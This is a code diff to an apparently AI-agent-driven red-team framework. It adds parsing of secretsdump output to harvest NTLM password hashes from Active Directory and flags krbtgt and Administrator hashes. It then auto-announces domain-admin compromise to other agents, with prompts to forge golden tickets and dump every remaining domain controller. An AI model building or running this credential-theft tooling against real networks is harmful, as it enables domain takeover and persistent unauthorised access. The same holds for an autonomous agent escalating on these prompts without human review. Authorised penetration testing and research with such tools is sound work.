@@ -804,11 +804,16 @@ class CredentialHarvestingTools(Toolset):
     """Tools for harvesting credentials via Active Directory attacks."""
 
     state: AnyRedTeamState | None = None
+    dispatcher: Any | None = None
     _PLACEHOLDER_PASSWORDS: ClassVar[set[str]] = PLACEHOLDER_PASSWORDS
 
     def set_state(self, state: AnyRedTeamState) -> None:
         """Set the operation state for this toolset."""
         self.state = state
+
+    def set_dispatcher(self, dispatcher) -> None:
+        """Set the dispatcher for inter-agent communication."""
+        self.dispatcher = dispatcher
 
     def _resolve_password(
         self,
@@ -829,6 +834,102 @@ class CredentialHarvestingTools(Toolset):
             return False, f"SMB port 445 not reachable: {stderr or stdout}"
         except Exception as e:
             return False, f"Connectivity check failed: {e}"
+
+    def _parse_secretsdump_output(
+        self, output: str, domain: str | None, target: str
+    ) -> tuple[str, list[dict], bool, bool]:
+        """Parse secretsdump output for NTLM hashes.
+
+        Args:
+            output: Raw secretsdump output
+            domain: Target domain name
+            target: Target IP/hostname
+
+        Returns:
+            Tuple of (formatted_output, parsed_hashes, has_krbtgt, has_administrator)
+        """
+        if not output:
+            return output, [], False, False
+
+        # Pattern for secretsdump hash lines:
+        # username:rid:lmhash:nthash:::
+        # or domain\username:rid:lmhash:nthash:::
+        hash_pattern = re.compile(
+            r"^(?:([^\\:\s]+)\\)?([^:]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::$",
+            re.MULTILINE,
+        )
+
+        parsed_hashes: list[dict] = []
+        has_krbtgt = False
+        has_administrator = False
+
+        for match in hash_pattern.finditer(output):
+            hash_domain = match.group(1) or domain or ""
+            username = match.group(2)
+            rid = int(match.group(3))
+            lm_hash = match.group(4)
+            nt_hash = match.group(5)
+
+            # Skip empty/null hashes (well-known empty password hash)
+            if nt_hash == "31d6cfe0d16ae931b73c59d7e0c089c0":  # pragma: allowlist secret
+                continue  # Empty password hash
+
+            hash_value = f"{lm_hash}:{nt_hash}"
+            is_krbtgt = rid == 502 or username.lower() == "krbtgt"
+            is_administrator = rid == 500 or username.lower() == "administrator"
+
+            if is_krbtgt:
+                has_krbtgt = True
+                logger.warning(f"[!] KRBTGT HASH FOUND! RID={rid}")
+            if is_administrator:
+                has_administrator = True
+                logger.warning(f"[!] ADMINISTRATOR HASH FOUND! RID={rid}")
+
+            parsed_hashes.append(
+                {
+                    "username": username,
+                    "domain": hash_domain,
+                    "rid": rid,
+                    "hash_value": hash_value,
+                    "nt_hash": nt_hash,
+                    "is_krbtgt": is_krbtgt,
+                    "is_administrator": is_administrator,
+                }
+            )
+
+            # Add to state
+            if self.state:
+                from ares.core.models import Hash
+
+                hash_obj = Hash(
+                    username=username,
+                    hash_value=hash_value,
+                    hash_type="NTLM",
+                    domain=hash_domain,
+                )
+                if hasattr(self.state, "add_hash"):
+                    self.state.add_hash(hash_obj, "secretsdump")
+                elif hasattr(self.state, "hashes"):
+                    self.state.hashes.append(hash_obj)
+
+        # Prepend summary if high-value hashes found
+        summary_lines = []
+        if has_krbtgt:
+            summary_lines.append(
+                "🚨 KRBTGT HASH EXTRACTED - GOLDEN TICKET POSSIBLE!\n"
+                "→ Use generate_golden_ticket to forge tickets\n"
+                "→ This grants PERSISTENT domain admin access"
+            )
+        if has_administrator:
+            summary_lines.append(
+                "🚨 ADMINISTRATOR HASH EXTRACTED - DOMAIN ADMIN ACHIEVED!\n"
+                "→ Use domain_admin_checker to verify access\n"
+                "→ Run secretsdump on all remaining DCs"
+            )
+
+        formatted_output = "\n\n".join(summary_lines) + "\n\n" + output if summary_lines else output
+
+        return formatted_output, parsed_hashes, has_krbtgt, has_administrator
 
     @dn.tool_method
     def secretsdump(  # noqa: PLR0912
@@ -930,7 +1031,38 @@ class CredentialHarvestingTools(Toolset):
                 )
 
             logger.info(f"[*] Secretsdump completed for {target}")
-            return stdout or stderr or f"Secretsdump returned code {returncode}"
+            raw_output = stdout or stderr or f"Secretsdump returned code {returncode}"
+
+            # Parse the output to extract hashes and detect high-value accounts
+            formatted_output, _parsed_hashes, has_krbtgt, has_administrator = (
+                self._parse_secretsdump_output(raw_output, domain, target)
+            )
+
+            # Auto-announce Domain Admin if krbtgt or Administrator hash found
+            if (has_krbtgt or has_administrator) and self.dispatcher:
+                try:
+                    cred_type = "krbtgt_hash" if has_krbtgt else "administrator_hash"
+                    attack_path = (
+                        f"krbtgt hash via secretsdump on {target}"
+                        if has_krbtgt
+                        else f"Administrator hash via secretsdump on {target}"
+                    )
+
+                    # Run async announce in sync context
+                    asyncio.run(
+                        self.dispatcher.announce_domain_admin(
+                            username="Administrator",
+                            domain=domain or "",
+                            attack_path=attack_path,
+                            credential_type=cred_type,
+                            source_agent="credential_access",
+                        )
+                    )
+                    logger.success(f"🎯 DOMAIN ADMIN AUTO-ANNOUNCED! {cred_type} found on {target}")
+                except Exception as e:
+                    logger.warning(f"Failed to auto-announce DA: {e}")
+
+            return formatted_output
 
         except Exception as e:
             return f"[!] Secretsdump error: {e}"
